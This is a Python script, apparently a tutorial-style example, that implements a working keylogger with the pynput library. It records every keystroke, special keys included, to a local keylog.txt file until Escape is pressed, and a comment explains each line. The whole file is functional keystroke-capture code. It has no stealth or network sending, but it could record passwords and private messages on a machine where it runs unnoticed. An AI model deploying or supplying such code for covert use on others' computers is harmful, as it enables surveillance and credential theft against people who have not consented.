import pynput.keyboard as keyboard  # Importing the keyboard module from pynput

log = ""  # Initializing an empty string to store the keystrokes

def on_press(key):  # Defining a function to handle key press events
    global log  # Declaring the log variable as global to modify it within the function
    try:
        log += key.char  # Attempting to append the character of the key to the log
    except AttributeError:  # Handling special keys that do not have a char attribute
        if key == key.space:  # Checking if the key is a space
            log += " "  # Appending a space character to the log
        else:
            log += " " + str(key) + " "  # Appending the string representation of the key to the log

    with open("keylog.txt", "a") as log_file:  # Opening the keylog.txt file in append mode (Create keylog.txt if not created and then open in append mode)
        log_file.write(log)  # Writing the current log to the file
        log = ""  # Resetting the log to an empty string

def on_release(key):  # Defining a function to handle key release events
    if key == keyboard.Key.esc:  # Checking if the released key is the Escape key
        return False  # Returning False to stop the listener

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:  # Creating a keyboard listener
    listener.join()  # Starting the listener and waiting for it to complete
